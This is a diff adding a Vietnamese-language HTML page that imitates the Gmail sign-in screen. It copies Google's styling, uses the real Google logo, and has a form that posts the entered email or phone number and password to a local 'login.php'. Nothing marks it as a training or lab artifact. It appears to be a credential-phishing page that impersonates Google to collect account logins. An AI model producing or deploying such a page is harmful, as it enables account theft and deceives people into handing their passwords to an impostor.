@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Đăng nhập - Gmail</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Arial', sans-serif;
+      background-color: #f1f3f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background-color: white;
+      border-radius: 8px;
+      padding: 40px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 0 0 10px;
+      color: #202124;
+    }
+    p {
+      color: #5f6368;
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+    input[type="text"]:focus, input[type="password"]:focus {
+      border-color: #1a73e8;
+      outline: none;
+    }
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .actions a {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+    button {
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      padding: 10px 24px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #185abc;
+    }
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #5f6368;
+    }
+    .footer-links a {
+      margin: 0 8px;
+      text-decoration: none;
+      color: #5f6368;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_74x24dp.png" alt="Google Logo">
+    <h1>Đăng nhập</h1>
+    <p>Tiếp tục tới Gmail</p>
+    
+    <form action="login.php" method="POST">
+      <input type="text" name="username" placeholder="Email hoặc số điện thoại" required>
+      <input type="password" name="password" placeholder="Nhập password" required>
+      <div class="actions">
+        <a href="#">Bạn quên địa chỉ email?</a>
+      </div>
+      <button type="submit">Tiếp theo</button>
+    </form>
+
+    <p><a href="#">Tạo tài khoản</a></p>
+    
+    <div class="footer-links">
+      <a href="#">Trợ giúp</a>
+      <a href="#">Quyền riêng tư</a>
+      <a href="#">Điều khoản</a>
+    </div>
+  </div>
+
+</body>
+</html>
